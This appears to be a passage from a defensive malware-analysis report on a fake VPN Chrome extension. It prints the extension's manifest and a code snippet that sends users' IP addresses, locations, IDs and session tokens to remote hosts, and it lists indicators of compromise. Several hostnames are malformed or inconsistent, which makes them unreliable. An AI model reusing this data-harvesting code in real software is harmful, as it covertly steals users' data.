* **primary operational domain:** `troywell.org`
* **active injection element signatures:** `#twell-caa`, `caa/styles.css`, `-caa-extension`
* **internal control hooks:** `setCaaInfo`, `applyProgram`
* **master background bundle worker:** `bg/bundle.js` (compiled vue.js framework core)

---

# 📁 case study 11: vpn proxy master (fake clone)

### 📌 metadata
* **extension name:** vpn proxy master: change ip for chrome
* **extension id:** lnfdmdhmfbimhhpaeocncdlhiodoblbd
* **target c2 infrastructure:** ://flashpull.com / 301.fastwalk.net / vpnproxymaster.com
* **platform:** chromium marketplace (manifest v3 architecture)
* **status:** 🔴 active threat / user ip and session token harvester

### 🚨 suspicious host permission aggregation
this extension requests a highly deceptive footprint that deliberately injects third-party traffic-steering networks directly into the required global host definitions:
```json
"permissions": [ "proxy", "unlimitedStorage", "notifications", "storage", "webRequest", "webRequestAuthProvider" ],
"host_permissions": [ 
  "https://vpnproxymaster.com*", "https://google.com*", 
  "https://://flashpull.com/*", "http://fastwalk.net*", 
  "https://google-analytics.com*", "*://*/*" 
]
```

#### technical impact:
* **`*://*/*` + `webRequest`:** secures mandatory, permanent authority to intercept and capture traffic states across every website globally without requiring runtime opt-in consent prompts.
* **`://flashpull.com` + `301.fastwalk.net`:** grants the application explicit authority to route internal web navigation events straight through untrusted external affiliate networks and permanent redirect infrastructure layers.

---

### 🔍 technical code deep-dive

#### 1. dynamic user ip and session token exfiltration
static analysis of the runtime background communication scripts unmasked a persistent telemetry logging engine configured to serialize and exfiltrate raw connection profiles to ad-tech nodes:

```javascript
w = JSON.parse(window.localStorage.userInfo);
chrome.storage.local.get(["proxyConfig", "userMessage"], (function(t) {
    var e = t.proxyConfig.proxyConfig, r = t.userMessage;
    var i = {
        host: e.ip, domain: e.host,
        user_id: "", app_uuid: w.user_id, is_vip: n,
        country: r.geoplugin_countryCode,
        user_ip: r.geoplugin_request,
        protocol: o, port: u, app_type: s, app_package_name: p, app_ver: x.version, conn_time: d, network_type: v, network_name: y,
        os_lang: window.navigator.language, os: window.navigator.platform,
        token: b
    };
    Object(c.b)("https://://flashpull.com/mms/report/v1/connection", i)
        .catch((function(t) {
            Object(c.b)("http://fastwalk.netmms/report/v1/connection", i)
        }));
}));
```

* **analysis:** the code maps a clear data-harvesting process. the extension fetches the user's unencrypted personal identifier (`app_uuid`), parses response tokens to extract their real-world public network ip address (`user_ip`), isolates their physical geographic territory location (`country`), and binds it directly to active proxy session authorization tokens (`token`). it transmits these packets via background channels straight to `://flashpull.com`, deploying an unencrypted http fallback routine to `301.fastwalk.net` if the primary tracking stream is interrupted.

#### 2. browser user-agent and mobile device profiling
deep static analysis of the background utility modules uncovered specific regular expression routines designed to parse user environments and isolate mobile signatures:

```javascript
function(t, e, n) { 
    var r = n(31); 
    t.exports = /(?:ipad|iphone|ipod).*applewebkit/i.test(r) 
}, 
function(t, e, n) { 
    var r = n(0), o = n(39), i = n(9), c = n(11), u = n(27);
    var h = r.TypeError;
    var v = function(t, e) { this.stopped = t, this.result = e };
}
```

* **analysis:** the framework runs custom environment filters to parse the device's raw user-agent string text. by executing targeted regular expression verification checks (`/(?:ipad|iphone|ipod).*applewebkit/i`), the script explicitly tests if the local machine matches an ios environment. this device-profiling mechanism pipes hardware signatures directly into the `os` and `app_type` parameters of the master connection report object, segmenting user records for monetization.

#### 3. systematic degradation of content security policies
the manifest file layout outlines an aggressive content security policy configuration engineered to lower the sandboxed constraints of extension pages:

```json
"extension_pages": "default-src 'self' https://vpnproxymaster.com http://geoplugin.net https://google-analytics.com https://googletagmanager.com https://://flashpull.com http://fastwalk.net https://google.com http://google-analytics.com https://*.googleapis.com https://*.doubleclick.net https://vpnproxymaster.com; script-src 'self'; script-src-elem 'self' https://google-analytics.com; object-src 'self';"
```

* **analysis:** by explicitly whitelisting tracking nodes (`doubleclick.net`, `google-analytics.com`) and external lookup scripts (`geoplugin.net`) right beside their data-harvesting servers (`flashpull.com`), the utility opens structural holes across the application's runtime boundaries. this architecture strips away standard script isolation rules, providing unverified trackers with explicit programmatic authority to operate inside the extension context.

---

### 🛡️ indicators of compromise (iocs)
* **primary exfiltration telemetry endpoints:** `https://://flashpull.com/mms/report/v1/connection`, `http://fastwalk.netmms/report/v1/connection`
* **device-fingerprinting regex targets:** `/(?:ipad|iphone|ipod).*applewebkit/i`
* **monitored system tokens:** `user_ip` (r.geoplugin_request), `app_uuid`, `token`, `os`, `app_type`, `country`
* **global traffic interception flag:** `*://*/*` via web request interception handlers.


---
*Report Compilation and Threat Analysis verified via code review guidelines.*

## We're going to hunt for more malicious "VPNS" and post our report here, be sure to star this project to see more vpns to avoid.
